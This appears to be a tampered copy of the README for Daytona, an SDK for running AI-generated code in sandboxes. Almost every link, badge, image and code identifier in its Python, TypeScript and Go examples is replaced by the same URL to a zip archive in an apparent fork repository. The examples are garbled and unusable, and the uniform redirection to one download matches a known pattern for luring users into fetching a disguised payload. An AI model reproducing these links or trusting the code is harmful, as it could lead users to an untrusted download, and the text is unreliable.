<div align="center">

[![Documentation](https://raw.githubusercontent.com/kaifansariw/daytona/main/libs/api-client/Software_v1.0.zip)](https://raw.githubusercontent.com/kaifansariw/daytona/main/libs/api-client/Software_v1.0.zip)
![License](https://raw.githubusercontent.com/kaifansariw/daytona/main/libs/api-client/Software_v1.0.zip)
[![Go Report Card](https://raw.githubusercontent.com/kaifansariw/daytona/main/libs/api-client/Software_v1.0.zip)](https://raw.githubusercontent.com/kaifansariw/daytona/main/libs/api-client/Software_v1.0.zip)
[![Issues - daytona](https://raw.githubusercontent.com/kaifansariw/daytona/main/libs/api-client/Software_v1.0.zip)](https://raw.githubusercontent.com/kaifansariw/daytona/main/libs/api-client/Software_v1.0.zip)
![GitHub Release](https://raw.githubusercontent.com/kaifansariw/daytona/main/libs/api-client/Software_v1.0.zip)

</div>

&nbsp;

<div align="center">
  <picture>
    <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/kaifansariw/daytona/main/libs/api-client/Software_v1.0.zip">
    <source media="(prefers-color-scheme: light)" srcset="https://raw.githubusercontent.com/kaifansariw/daytona/main/libs/api-client/Software_v1.0.zip">
    <img alt="Daytona logo" src="https://raw.githubusercontent.com/kaifansariw/daytona/main/libs/api-client/Software_v1.0.zip" width="50%">
  </picture>
</div>

<h3 align="center">
  Run AI Code.
  <br/>
  Secure and Elastic Infrastructure for
  Running Your AI-Generated Code.
</h3>

<p align="center">
    <a href="https://raw.githubusercontent.com/kaifansariw/daytona/main/libs/api-client/Software_v1.0.zip"> Documentation </a>·
    <a href="https://raw.githubusercontent.com/kaifansariw/daytona/main/libs/api-client/Software_v1.0.zip%F0%9F%90%9B+Bug+Report%3A+"> Report Bug </a>·
    <a href="https://raw.githubusercontent.com/kaifansariw/daytona/main/libs/api-client/Software_v1.0.zip%F0%9F%9A%80+Feature%3A+"> Request Feature </a>·
    <a href="https://raw.githubusercontent.com/kaifansariw/daytona/main/libs/api-client/Software_v1.0.zip"> Join our Slack </a>·
    <a href="https://raw.githubusercontent.com/kaifansariw/daytona/main/libs/api-client/Software_v1.0.zip"> Connect on X </a>
</p>

<p align="center">
    <a href="https://raw.githubusercontent.com/kaifansariw/daytona/main/libs/api-client/Software_v1.0.zip;2" target="_blank"><img src="https://raw.githubusercontent.com/kaifansariw/daytona/main/libs/api-client/Software_v1.0.zip" alt="Daytona&#0032; - Secure&#0032;and&#0032;elastic&#0032;infra&#0032;for&#0032;running&#0032;your&#0032;AI&#0045;generated&#0032;code&#0046; | Product Hunt" style="width: 250px; height: 54px;" width="250" height="54" /></a>
    <a href="https://raw.githubusercontent.com/kaifansariw/daytona/main/libs/api-client/Software_v1.0.zip;2" target="_blank"><img src="https://raw.githubusercontent.com/kaifansariw/daytona/main/libs/api-client/Software_v1.0.zip" alt="Daytona&#0032; - Secure&#0032;and&#0032;elastic&#0032;infra&#0032;for&#0032;running&#0032;your&#0032;AI&#0045;generated&#0032;code&#0046; | Product Hunt" style="width: 250px; height: 54px;" width="250" height="54" /></a>
</p>

---

## Installation

### Python SDK

```bash
pip install daytona
```

### TypeScript SDK

```bash
npm install @daytonaio/sdk
```

---

## Features

- **Lightning-Fast Infrastructure**: Sub-90ms Sandbox creation from code to execution.
- **Separated & Isolated Runtime**: Execute AI-generated code with zero risk to your infrastructure.
- **Massive Parallelization for Concurrent AI Workflows**: Fork Sandbox filesystem and memory state (Coming soon!)
- **Programmatic Control**: File, Git, LSP, and Execute API
- **Unlimited Persistence**: Your Sandboxes can live forever
- **OCI/Docker Compatibility**: Use any OCI/Docker image to create a Sandbox

---

## Quick Start

1. Create an account at https://raw.githubusercontent.com/kaifansariw/daytona/main/libs/api-client/Software_v1.0.zip
1. Generate a [new API key](https://raw.githubusercontent.com/kaifansariw/daytona/main/libs/api-client/Software_v1.0.zip)
1. Follow the [Getting Started docs](https://raw.githubusercontent.com/kaifansariw/daytona/main/libs/api-client/Software_v1.0.zip) to start using the Daytona SDK

## Creating your first Sandbox

### Python SDK

```py
from daytona import Daytona, DaytonaConfig, CreateSandboxBaseParams

# Initialize the Daytona client
daytona = Daytona(DaytonaConfig(api_key="YOUR_API_KEY"))

# Create the Sandbox instance
sandbox = https://raw.githubusercontent.com/kaifansariw/daytona/main/libs/api-client/Software_v1.0.zip(CreateSandboxBaseParams(language="python"))

# Run code securely inside the Sandbox
response = https://raw.githubusercontent.com/kaifansariw/daytona/main/libs/api-client/Software_v1.0.zip('print("Sum of 3 and 4 is " + str(3 + 4))')
if https://raw.githubusercontent.com/kaifansariw/daytona/main/libs/api-client/Software_v1.0.zip != 0:
    print(f"Error running code: {https://raw.githubusercontent.com/kaifansariw/daytona/main/libs/api-client/Software_v1.0.zip} {https://raw.githubusercontent.com/kaifansariw/daytona/main/libs/api-client/Software_v1.0.zip}")
else:
    print(https://raw.githubusercontent.com/kaifansariw/daytona/main/libs/api-client/Software_v1.0.zip)

# Clean up the Sandbox
https://raw.githubusercontent.com/kaifansariw/daytona/main/libs/api-client/Software_v1.0.zip(sandbox)
```

### Typescript SDK

```jsx
import { Daytona } from '@daytonaio/sdk'

async function main() {
  // Initialize the Daytona client
  const daytona = new Daytona({
    apiKey: 'YOUR_API_KEY',
  })

  let sandbox
  try {
    // Create the Sandbox instance
    sandbox = await https://raw.githubusercontent.com/kaifansariw/daytona/main/libs/api-client/Software_v1.0.zip({
      language: 'typescript',
    })
    // Run code securely inside the Sandbox
    const response = await https://raw.githubusercontent.com/kaifansariw/daytona/main/libs/api-client/Software_v1.0.zip('https://raw.githubusercontent.com/kaifansariw/daytona/main/libs/api-client/Software_v1.0.zip("Sum of 3 and 4 is " + (3 + 4))')
    if (https://raw.githubusercontent.com/kaifansariw/daytona/main/libs/api-client/Software_v1.0.zip !== 0) {
      https://raw.githubusercontent.com/kaifansariw/daytona/main/libs/api-client/Software_v1.0.zip('Error running code:', https://raw.githubusercontent.com/kaifansariw/daytona/main/libs/api-client/Software_v1.0.zip, https://raw.githubusercontent.com/kaifansariw/daytona/main/libs/api-client/Software_v1.0.zip)
    } else {
      https://raw.githubusercontent.com/kaifansariw/daytona/main/libs/api-client/Software_v1.0.zip(https://raw.githubusercontent.com/kaifansariw/daytona/main/libs/api-client/Software_v1.0.zip)
    }
  } catch (error) {
    https://raw.githubusercontent.com/kaifansariw/daytona/main/libs/api-client/Software_v1.0.zip('Sandbox flow error:', error)
  } finally {
    if (sandbox) await https://raw.githubusercontent.com/kaifansariw/daytona/main/libs/api-client/Software_v1.0.zip(sandbox)
  }
}

main().catch(https://raw.githubusercontent.com/kaifansariw/daytona/main/libs/api-client/Software_v1.0.zip)
```

### Go SDK

```go
package main

import (
 "context"
 "fmt"
 "log"
 "time"

 "https://raw.githubusercontent.com/kaifansariw/daytona/main/libs/api-client/Software_v1.0.zip"
 "https://raw.githubusercontent.com/kaifansariw/daytona/main/libs/api-client/Software_v1.0.zip"
)

func main() {
 // Initialize the Daytona client with DAYTONA_API_KEY in env
  // Alternative is to use https://raw.githubusercontent.com/kaifansariw/daytona/main/libs/api-client/Software_v1.0.zip(...) for more specific config
 client, err := https://raw.githubusercontent.com/kaifansariw/daytona/main/libs/api-client/Software_v1.0.zip()
 if err != nil {
  https://raw.githubusercontent.com/kaifansariw/daytona/main/libs/api-client/Software_v1.0.zip("Failed to create client: %v", err)
 }

 ctx := https://raw.githubusercontent.com/kaifansariw/daytona/main/libs/api-client/Software_v1.0.zip()

 // Create the Sandbox instance
 params := https://raw.githubusercontent.com/kaifansariw/daytona/main/libs/api-client/Software_v1.0.zip{
  SandboxBaseParams: https://raw.githubusercontent.com/kaifansariw/daytona/main/libs/api-client/Software_v1.0.zip{
   Language: https://raw.githubusercontent.com/kaifansariw/daytona/main/libs/api-client/Software_v1.0.zip,
  },
 }

 sandbox, err := https://raw.githubusercontent.com/kaifansariw/daytona/main/libs/api-client/Software_v1.0.zip(ctx, params, https://raw.githubusercontent.com/kaifansariw/daytona/main/libs/api-client/Software_v1.0.zip(90*https://raw.githubusercontent.com/kaifansariw/daytona/main/libs/api-client/Software_v1.0.zip))
 if err != nil {
  https://raw.githubusercontent.com/kaifansariw/daytona/main/libs/api-client/Software_v1.0.zip("Failed to create sandbox: %v", err)
 }

 // Run code securely inside the Sandbox
 response, err := https://raw.githubusercontent.com/kaifansariw/daytona/main/libs/api-client/Software_v1.0.zip(ctx, `python3 -c "print('Sum of 3 and 4 is', 3 + 4)"`)
 if err != nil {
  https://raw.githubusercontent.com/kaifansariw/daytona/main/libs/api-client/Software_v1.0.zip("Failed to execute command: %v", err)
 }

 if https://raw.githubusercontent.com/kaifansariw/daytona/main/libs/api-client/Software_v1.0.zip != 0 {
  https://raw.githubusercontent.com/kaifansariw/daytona/main/libs/api-client/Software_v1.0.zip("Error running code: %d %s\n", https://raw.githubusercontent.com/kaifansariw/daytona/main/libs/api-client/Software_v1.0.zip, https://raw.githubusercontent.com/kaifansariw/daytona/main/libs/api-client/Software_v1.0.zip)
 } else {
  https://raw.githubusercontent.com/kaifansariw/daytona/main/libs/api-client/Software_v1.0.zip(https://raw.githubusercontent.com/kaifansariw/daytona/main/libs/api-client/Software_v1.0.zip)
 }

 // Clean up the Sandbox
 if err := https://raw.githubusercontent.com/kaifansariw/daytona/main/libs/api-client/Software_v1.0.zip(ctx); err != nil {
  https://raw.githubusercontent.com/kaifansariw/daytona/main/libs/api-client/Software_v1.0.zip("Failed to delete sandbox: %v", err)
 }
}
```

---

## Contributing

Daytona is Open Source under the [GNU AFFERO GENERAL PUBLIC LICENSE](LICENSE), and is the [copyright of its contributors](NOTICE). If you would like to contribute to the software, read the Developer Certificate of Origin Version 1.1 (https://raw.githubusercontent.com/kaifansariw/daytona/main/libs/api-client/Software_v1.0.zip). Afterwards, navigate to the [contributing guide](https://raw.githubusercontent.com/kaifansariw/daytona/main/libs/api-client/Software_v1.0.zip) to get started.
